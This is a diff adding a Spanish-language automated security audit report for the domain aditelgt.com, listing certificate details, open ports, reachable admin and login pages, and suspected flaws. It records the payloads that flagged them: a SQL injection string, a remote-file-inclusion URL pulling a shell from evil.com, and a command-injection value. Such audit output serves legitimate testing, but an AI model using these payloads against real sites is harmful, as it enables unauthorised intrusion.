@@ -1,0 +1,27 @@
+=== Resultados de Auditoría ===
+Dirección IP del servidor: 104.21.10.29
+
+Certificado SSL:
+    - Nombre Común: aditelgt.com
+    - Emisor: countryName: US, organizationName: Google Trust Services, commonName: WE1
+    - Válido desde: Oct 10 08:26:32 2024 GMT
+    - Válido hasta: Jan  8 08:26:31 2025 GMT
+    - Dominios Alternativos (SANs): aditelgt.com, *.aditelgt.com
+
+Verificación de Endpoints:
+    /admin: https://aditelgt.com/admin, estado: 200
+    /login: https://aditelgt.com/login, estado: 200
+    /test: https://aditelgt.com/test, estado: 404
+    /backup: https://aditelgt.com/backup, estado: 404
+
+=== Escaneo de Puertos ===
+Puertos abiertos: 80, 443
+
+=== Resultados de Vulnerabilidades ===
+Posible vulnerabilidad de inyección SQL detectada con el payload: ' OR 1=1 --
+No se detectaron vulnerabilidades XSS.
+No se detectaron vulnerabilidades LFI.
+Posible vulnerabilidad RFI detectada con el payload: http://evil.com/shell.txt
+No se detectaron vulnerabilidades de Open Redirect.
+Posible vulnerabilidad de inyección de comandos detectada con el payload: 1; ls
+No se detectaron vulnerabilidades de Directory Traversal.
